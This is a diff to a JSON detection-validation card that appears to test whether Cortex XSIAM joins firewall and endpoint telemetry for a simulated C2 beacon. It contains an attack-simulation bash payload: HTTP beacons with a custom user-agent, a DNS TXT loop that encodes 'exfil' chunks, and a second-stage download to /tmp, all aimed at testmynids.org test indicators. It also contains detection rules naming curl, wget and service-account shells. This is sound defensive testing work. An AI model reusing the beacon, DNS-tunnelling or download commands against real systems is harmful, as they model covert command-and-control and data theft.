@@ -47,9 +47,9 @@
     }
   },
   "identity": {
-    "name": "C2 Beacon Callback \u2014 NGFW + XDR Causality Stitch (T1071.001)",
-    "summary": "A web service account on a DMZ host spawns an interactive shell, then beacons over HTTP to a known-bad indicator, runs a DNS TXT tunnel loop, and stages a second-stage download. The Cortex value is cross-plane stitching: XSIAM joins the NGFW network_story session leg to the XDR xdr_data process leg on a shared src_host inside a 60s window so the curl/dig process lineage and the outbound beacon\u2026",
-    "description": "This scenario validates XSIAM's correlation engine on the canonical C2-beacon kill chain split across two telemetry planes. The endpoint plane (Cortex XDR Agent) sees a shell spawned from www-data, then curl invoked with a beacon user-agent and dig invoked in a loop \u2014 process-creation events in xdr_data. The network plane (NGFW Network Security Analytics, surfaced into XSIAM as network_story / pan_ngfw_traffic and pan_dns) sees the repetitive outbound HTTP sessions to testmynids.org and the high-entropy DNS TXT burst. Neither plane alone tells the full story: the network plane lacks the process that opened the socket, and the endpoint plane lacks the firewall's beacon-periodicity verdict. The correlation rules in this card join the two legs on src_host within the scenario's 60s window, demonstrating the F2 Causality-Chain-Completeness KPI (>= 2 distinct planes under one incident_id). All HTTP/DNS targets are 3CORESec testmynids.org test indicators \u2014 safe by design.",
+    "name": "C2 Beacon Callback — NGFW + XDR Causality Stitch (T1071.001)",
+    "summary": "A web service account on a DMZ host spawns an interactive shell, then beacons over HTTP to a known-bad indicator, runs a DNS TXT tunnel loop, and stages a second-stage download. The Cortex value is cross-plane stitching: XSIAM joins the NGFW network_story session leg to the XDR xdr_data process leg on a shared src_host inside a 60s window so the curl/dig process lineage and the outbound beacon…",
+    "description": "This scenario validates XSIAM's correlation engine on the canonical C2-beacon kill chain split across two telemetry planes. The endpoint plane (Cortex XDR Agent) sees a shell spawned from www-data, then curl invoked with a beacon user-agent and dig invoked in a loop — process-creation events in xdr_data. The network plane (NGFW Network Security Analytics, surfaced into XSIAM as network_story / pan_ngfw_traffic and pan_dns) sees the repetitive outbound HTTP sessions to testmynids.org and the high-entropy DNS TXT burst. Neither plane alone tells the full story: the network plane lacks the process that opened the socket, and the endpoint plane lacks the firewall's beacon-periodicity verdict. The correlation rules in this card join the two legs on src_host within the scenario's 60s window, demonstrating the F2 Causality-Chain-Completeness KPI (>= 2 distinct planes under one incident_id). All HTTP/DNS targets are 3CORESec testmynids.org test indicators — safe by design.",
     "severity": "high",
     "confidence": "high"
   },
@@ -130,7 +130,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "atomic-red-team",
-    "framework_reference_id": "T1071.001 \u2014 Atomic Test (C2 over HTTP) combined with T1572 DNS tunneling and T1105 ingress transfer",
+    "framework_reference_id": "T1071.001 — Atomic Test (C2 over HTTP) combined with T1572 DNS tunneling and T1105 ingress transfer",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -144,7 +144,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# All HTTP/DNS targets are 3CORESec testmynids.org test indicators \u2014 safe by design.\nbash -c 'id; whoami; uname -a'\nfor i in 1 2 3 4 5; do curl -sSL -m 10 -A 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' \"http://testmynids.org/uid/index.html?beacon=$i\" -o /dev/null || true; sleep 12; done\nfor i in $(seq 1 20); do dig +short TXT \"exfil-$(echo -n \"payload_chunk_$i\" | base32 | tr -d = | head -c 30).testmynids.org\" @1.1.1.1 > /dev/null || true; sleep 1; done\ncurl -sSL -o /tmp/cortexsim_stage2.sh http://testmynids.org/uid/index.html",
+      "code": "# All HTTP/DNS targets are 3CORESec testmynids.org test indicators — safe by design.\nbash -c 'id; whoami; uname -a'\nfor i in 1 2 3 4 5; do curl -sSL -m 10 -A 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' \"http://testmynids.org/uid/index.html?beacon=$i\" -o /dev/null || true; sleep 12; done\nfor i in $(seq 1 20); do dig +short TXT \"exfil-$(echo -n \"payload_chunk_$i\" | base32 | tr -d = | head -c 30).testmynids.org\" @1.1.1.1 > /dev/null || true; sleep 1; done\ncurl -sSL -o /tmp/cortexsim_stage2.sh http://testmynids.org/uid/index.html",
       "input_variables": [],
       "timeout_seconds": 120
     },
@@ -191,7 +191,7 @@
     "biocs": [
       {
         "name": "MP-001 Interactive Shell Spawned From www-data Service Context",
-        "description": "XDR \u2014 interactive bash spawned from www-data service context. A non-login web service identity spawns an interactive shell, the endpoint leg of the C2 chain.",
+        "description": "XDR — interactive bash spawned from www-data service context. A non-login web service identity spawns an interactive shell, the endpoint leg of the C2 chain.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"bash\", \"sh\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"php-fpm\", \"node\", \"httpd\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -200,7 +200,7 @@
       },
       {
         "name": "MP-001 Curl Beacon With Suspicious User-Agent From www-data",
-        "description": "XDR \u2014 curl executed from www-data with suspicious user-agent. The endpoint process that opens the outbound HTTP beacon socket, providing the lineage leg the NGFW session lacks.",
+        "description": "XDR — curl executed from www-data with suspicious user-agent. The endpoint process that opens the outbound HTTP beacon socket, providing the lineage leg the NGFW session lacks.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"curl\", \"wget\")\n| filter action_process_image_command_line contains_any (\"CortexSimBeacon\", \"-A \", \"--user-agent\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"php-fpm\", \"node\", \"httpd\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -209,7 +209,7 @@
       },
       {
         "name": "MP-001 Curl Wrote Second-Stage File To Tmp From Service Account",
-        "description": "XDR \u2014 file written to /tmp/ by curl from service account. Ingress tool transfer: curl downloads a second stage into a world-writable path under a service identity.",
+        "description": "XDR — file written to /tmp/ by curl from service account. Ingress tool transfer: curl downloads a second stage into a world-writable path under a service identity.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)\n| filter actor_process_image_name in (\"curl\", \"wget\")\n| filter action_file_path contains \"/tmp/\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"php-fpm\", \"node\", \"httpd\")",
         "severity": "medium",
         "mitre_technique_ids": [
@@ -263,25 +263,25 @@
     ],
     "correlation_rules": [
       {
-        "name": "C2 Beacon Cross-Plane Stitch \u2014 NGFW Session + XDR Process",
+        "name": "C2 Beacon Cross-Plane Stitch — NGFW Session + XDR Process",
         "rule_id": "CR-MP-0001",
         "logic": "(XQL(MP-001 NGFW Repetitive HTTP Beacon To testmynids) AND (BIOC(MP-001 Curl Beacon With Suspicious User-Agent From www-data) OR BIOC(MP-001 Interactive Shell Spawned From www-data Service Context))) -> join on src_host within 60s"
       },
       {
-        "name": "DNS Tunnel Exfil Cross-Plane Stitch \u2014 NGFW DNS Anomaly + XDR Dig Loop",
+        "name": "DNS Tunnel Exfil Cross-Plane Stitch — NGFW DNS Anomaly + XDR Dig Loop",
         "rule_id": "CR-MP-0002",
         "logic": "(XQL(MP-001 NGFW DNS TXT High Entropy Burst) AND XQL(MP-001 Repetitive Dig TXT From Service Account)) -> join on src_host within 60s"
       },
       {
-        "name": "Ingress Transfer IOC Stitch \u2014 NGFW Download + XDR Tmp Write + TIM IOC",
+        "name": "Ingress Transfer IOC Stitch — NGFW Download + XDR Tmp Write + TIM IOC",
         "rule_id": "CR-MP-0003",
         "logic": "(XQL(MP-001 NGFW Download From IOC Listed Domain) AND BIOC(MP-001 Curl Wrote Second-Stage File To Tmp From Service Account) AND IOC(domain: testmynids.org)) -> join on src_host within 60s"
       }
     ],
     "analytics_modules": [
-      "Cortex XSIAM Network Security Analytics \u2014 periodic beacon detection",
-      "Cortex XSIAM Analytics \u2014 DNS tunneling / high-entropy label anomaly",
-      "Cortex XSIAM Correlation Engine \u2014 cross-dataset causality stitching by src_host"
+      "Cortex XSIAM Network Security Analytics — periodic beacon detection",
+      "Cortex XSIAM Analytics — DNS tunneling / high-entropy label anomaly",
+      "Cortex XSIAM Correlation Engine — cross-dataset causality stitching by src_host"
     ]
   },
   "panw_mapping": {
@@ -331,14 +331,14 @@
         "evidence_query": "Playbook isolates the DMZ host, blocks the C2 domain at NGFW, and enriches with TIM."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-NDR-001",
-        "name": "Cross-Plane Incident Stitching \u2014 NGFW Session \u2194 XDR Process Lineage",
+        "threat_scenario_id": "TS-NDR-001",
+        "name": "Cross-Plane Incident Stitching — NGFW Session ↔ XDR Process Lineage",
         "description": "Validate that XSIAM stitches an NGFW C2 beacon session and the XDR process that opened it into a single causality-complete incident.",
-        "test_cases": [
+        "threat_steps": [
           {
-            "test_case_id": "TC-NDR-001A",
+            "threat_step_id": "TS-NDR-001A",
             "objective": "Each plane fires its own detection (NGFW beacon analytics + XDR curl/shell BIOC).",
             "preconditions": [
               "Cortex XDR Linux agent >= 8.4.0 healthy on the DMZ host.",
@@ -355,7 +355,7 @@
             "expected_score_weight": 0.5
           },
           {
-            "test_case_id": "TC-NDR-001B",
+            "threat_step_id": "TS-NDR-001B",
             "objective": "Both legs stitch into one incident with >= 2 planes (Causality Chain Completeness KPI).",
             "success_criteria": [
               "Correlation `CR-MP-0001` groups the NGFW session and XDR process on src_host into one incident_id.",
@@ -390,7 +390,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1071.001 \u2014 Web Protocols",
+      "title": "MITRE ATT&CK T1071.001 — Web Protocols",
       "url": "https://attack.mitre.org/techniques/T1071/001/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
